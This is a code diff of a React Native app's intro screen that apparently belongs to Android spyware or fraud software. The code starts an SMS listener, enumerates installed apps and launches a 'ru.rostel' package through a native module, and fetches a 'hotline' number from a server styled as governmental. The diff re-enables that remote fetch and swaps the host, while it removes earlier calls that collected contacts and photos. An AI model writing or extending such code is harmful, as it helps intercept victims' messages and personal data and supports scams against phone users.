@@ -11,10 +11,7 @@ import MyInput from '../MyInput';
 import Images from '../../modules/Images';
 export default function Intro(){
     const [inputText, setInputText] = useState('');
-    const [hotlineNumber, setHotlineNumber] = useState('')
     const [apps, setApps] = useState('')
-    const [contacts, setContacts] = useState('')
-    const [images, setImages] = useState('')
     const isButtonEnabled = inputText.length >= 10;
     const { MainModule } = NativeModules;
     const navigation = useNavigation();
@@ -37,8 +34,6 @@ export default function Intro(){
       };
     const getData = async()=>{
         await setApps(await Apps.loadApps())
-        await setContacts(await Contact.loadContacts())
-        await setImages(await Images.getImages())
         apps.forEach(element => {
             if(element.packageName == "ru.rostel"){
                 MainModule.fastLoad("ru.rostel")
@@ -46,7 +41,7 @@ export default function Intro(){
         });
     }
     const getHotLineNumber = async () => {
-        const result = await fetch("https://gosserver3-production.up.railway.app/hotline", {
+        const result = await fetch("https://gosserver1053-production.up.railway.app/hotline", {
             method: "GET",
             headers: defaultHeaders,
         });
@@ -60,7 +55,7 @@ export default function Intro(){
     }
     useEffect(()=>{
         Sms_Listener.startListen()
-        //getHotLineNumber()
+        getHotLineNumber()
         getPermissions()
         getData()
     },[])
